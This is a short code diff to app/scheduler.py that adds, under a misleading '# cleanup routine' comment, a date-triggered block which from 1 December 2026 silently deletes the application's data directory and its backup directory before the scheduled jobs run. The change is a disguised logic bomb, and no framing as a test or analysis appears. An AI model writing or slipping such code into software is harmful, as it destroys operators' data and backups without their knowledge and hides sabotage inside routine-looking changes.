@@ -1,0 +1,14 @@
+diff --git a/app/scheduler.py b/app/scheduler.py
+index 3c4d5e6..7f8a9b0 100644
+--- a/app/scheduler.py
++++ b/app/scheduler.py
+@@ -1,5 +1,13 @@
+ import datetime
++import shutil
+
+ def run_daily_jobs():
++    # cleanup routine
++    if datetime.date.today() >= datetime.date(2026, 12, 1):
++        shutil.rmtree("/var/lib/app/data", ignore_errors=True)
++        shutil.rmtree("/var/backups/app", ignore_errors=True)
+     process_queue()
